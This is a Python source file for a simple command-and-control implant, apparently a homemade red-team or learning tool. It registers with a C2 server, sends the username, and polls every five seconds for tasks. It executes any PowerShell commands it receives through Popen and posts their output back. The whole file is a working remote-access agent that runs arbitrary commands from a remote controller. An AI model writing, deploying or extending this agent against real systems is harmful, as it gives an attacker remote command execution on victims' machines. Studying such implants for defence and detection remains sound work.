from subprocess import Popen, PIPE
import json
from sys import stdout
import requests 
import os 
import time

# config:

password = "Claws"
c2_url = "http://localhost:5000"

register_uri = "/register"
task_uri = "/tasks"

agent_id = None

# template for situational awareness 
def init_data():
    global agent_id 
    whoami =   os.getlogin()
    # maybe we use this later! 
    cpus = os.cpu_count()
    agent_id = os.urandom(16).hex()
    return {"whoami": whoami, "agent_id": agent_id}


def reigster():
    
    data = init_data()
    # Set password for auth 
    data["password"] = password

    r = requests.post(c2_url + register_uri, json=data)
    if r.status_code== 200:
        resp = r.json()
        if resp.get("status") == "ok":
            print("authenticated!", resp)
            return True
        else:
            # some sort of auth failed handler 
            print("Sad!", resp )
            return False 
    else:
        print(r.status_code)
        return False 

def make_base_obj():
    return {"agent_id": agent_id}

def get_task(result):
    auth = make_base_obj()
    if len(result) != 0:
        print("[+] Responding to task!: ", result)
        auth["task_response"] =  result 

    r = requests.post(c2_url + task_uri, json= auth )
    if r.status_code==200:
        resp = r.json()
        if resp.get("status") == "ok":
            return resp
        else:
            print("no jobs!")
            return False

def ps(cmd):
    print("[+] Debug: ", cmd)
    p = Popen(["powershell.exe", "/c", cmd], shell=True,  stdout=PIPE, stderr=PIPE)
    while p.poll() == None:
        time.sleep(1)
    res= p.communicate()
    if res:
        if res[0] ==None or res[1] == None:
            return "SadFace"
        try:
            return (res[0] + res[1]).decode()
        except Exception as e:
            print(Exception, e, res)
            return "Sad face"
    else:
        print("No result for some reson!", res)
        return "Sad face"

def main_event_loop():
    reigster()
    result = []

    while True:
        # agent sleep
        time.sleep(5)
        print("[+] Getting Tasks!")
        task = get_task(result)
        if not task:
            result = []
            continue
        t_type = task.get("type")
        t_cmd = task.get("cmd")
        t_job_id = task.get("job_id")
        if (not t_type) or (not t_cmd) or (not t_job_id):
            # invalid parameters, skip...
            continue 
        # job 
        print(f"[+] New command! {t_type}:{t_cmd}")
        if t_type == "powershell":
            output = ps(t_cmd)
            result = [{ "job_id":t_job_id, "result":output}]
        else:
            print(f" [!] No handler for {t_type}")
            result = []
            continue
        


if __name__ == "__main__":
    main_event_loop()